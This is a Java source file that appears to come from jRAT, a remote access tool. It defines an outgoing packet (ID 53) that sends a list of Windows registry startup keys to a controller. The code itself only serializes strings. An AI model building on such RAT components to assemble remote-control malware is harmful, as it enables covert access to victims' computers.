package jrat.client.packets.outgoing;

import jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet53RegistryStartup extends AbstractOutgoingPacket {

	private String[] keys;

	public Packet53RegistryStartup(String[] keys) {
		this.keys = keys;
	}

	public Packet53RegistryStartup(String key) {
		this.keys = new String[] { key };
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(keys.length);

		for (String key : keys) {
			sw.writeLine(key);
		}
	}

	@Override
	public short getPacketId() {
		return 53;
	}

}
